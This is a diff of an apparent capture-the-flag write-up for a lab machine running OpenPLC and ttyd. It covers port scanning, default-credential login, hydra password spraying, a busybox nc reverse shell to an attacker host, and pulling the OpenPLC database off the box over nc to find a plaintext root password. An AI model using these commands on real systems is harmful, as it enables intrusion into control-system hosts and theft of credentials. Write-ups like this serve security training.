@@ -14,9 +14,9 @@ An OpenPLC instance is found running with its default `openplc:openplc` credenti
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn open.nyx
@@ -29,7 +29,7 @@ PORT     STATE SERVICE     REASON
 MAC Address: 08:00:27:1D:9B:86 (Oracle VirtualBox virtual NIC)
 ```
 
-Four ports are found open: **22 (SSH)**, **80 (HTTP)**, **7681**, and **8080**. A version/script scan against all four fills in the details:
+Four ports come back open: **22 (SSH)**, **80 (HTTP)**, **7681**, and **8080**. A version and script scan on all four fills in the details:
 
 ```bash
 $ sudo nmap -p 22,80,7681,8080 -sCV open.nyx
@@ -63,14 +63,15 @@ The main page:
 ```
 http://open.nyx
 ```
+
 <img src="../Images/open/Pasted image 20260720235200.png"/>
 
-
-Port 7681 turns out to be `ttyd`, a tool that exposes a terminal over the browser:
+Port 7681 turns out to be `ttyd`, a tool that exposes a terminal over the browser — and it's behind HTTP Basic Auth:
 
 ```
 http://open.nyx:7681
 ```
+
 <img src="../Images/open/Pasted image 20260720235226.png"/>
 
 Port 8080 is an OpenPLC instance — an open-source platform for programmable logic controllers, with its own web management interface:
@@ -78,6 +79,7 @@ Port 8080 is an OpenPLC instance — an open-source platform for programmable lo
 ```
 http://open.nyx:8080
 ```
+
 <img src="../Images/open/Pasted image 20260720235255.png"/>
 <img src="../Images/open/Pasted image 20260720235329.png"/>
 
@@ -88,6 +90,7 @@ OpenPLC's default credentials work, granting access to its dashboard:
 ```
 http://open.nyx:8080/dashboard
 ```
+
 <img src="../Images/open/Pasted image 20260720235425.png"/>
 
 ## Initial Access
@@ -114,18 +117,19 @@ $ python3 49803.py -u http://open.nyx:8080 -l openplc -p openplc -i <ATTACKER_IP
 
 The version running is technically vulnerable, but this particular exploit isn't the intended entry point for the box — it targets a different angle than the one this machine actually exposes, so it fails despite the version match.
 
-With that path closed off, the interface is enumerated further instead. OpenPLC's own user management page leaks the full list of accounts:
+With that path closed off, the interface is worth enumerating further instead. OpenPLC's own user management page leaks the full list of accounts:
 
 ```
 http://open.nyx:8080/users
 ```
+
 <img src="../Images/open/Pasted image 20260720235601.png"/>
 
 > **Users:** `openplc`, `tirex`, `root`
 
 ### Credential Spraying Against ttyd
 
-With a set of usernames in hand, `hydra` sprays them against the `ttyd` terminal on port 7681:
+With a set of usernames in hand, `hydra` sprays them against the `ttyd` terminal's Basic Auth on port 7681:
 
 ```bash
 $ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt open.nyx -s 7681 http-get /
@@ -146,9 +150,10 @@ Logging into the terminal directly grants a shell in the browser:
 ```
 http://open.nyx:7681/
 ```
+
 <img src="../Images/open/Pasted image 20260720235712.png"/>
 
-A reverse shell is spawned from inside it anyway, to get something more usable outside the browser:
+Spawning a reverse shell from inside it gets something more usable outside the browser:
 
 > **Payload:** `busybox nc <ATTACKER_IP> <PORT> -e /bin/sh`
 
@@ -162,7 +167,7 @@ id
 uid=1000(tirex) gid=1000(tirex) groups=1000(tirex)
 ```
 
-The shell is upgraded to something usable:
+A quick pty upgrade makes the shell usable:
 
 ```bash
 python3 -c 'import pty; pty.spawn ("/bin/bash")'
@@ -205,7 +210,7 @@ tirex@open:~$ file /opt/OpenPLC_v3/webserver/openplc.db
      using SQLite version 3040001, file counter 552, database pages 13, 1st free page 10, free pages 3, cookie 0x10, schema 4, UTF-8, version-valid-for 552
 ```
 
-OpenPLC's own SQLite database is found on disk and exfiltrated over a raw `nc` transfer — the target sends the file into a connection, the attacker listens and redirects the incoming stream to a file:
+OpenPLC's own SQLite database comes off the box over a raw `nc` transfer — the target sends the file into a connection, the attacker listens and redirects the incoming stream to a file:
 
 ```bash
 # Victim Machine
@@ -215,12 +220,13 @@ tirex@open:~$ nc <ATTACKER_IP> <PORT> < /opt/OpenPLC_v3/webserver/openplc.db
 $ nc -lvp <PORT> > openplc.db
 ```
 
-The database is dumped locally:
+Dumping the database locally shows its full contents:
 
 ```bash
 $ sqlite3 openplc.db
 sqlite> .dump
 ```
+
 <img src="../Images/open/Pasted image 20260721000007.png"/>
 
 A `root` password sits in the dump in plaintext:
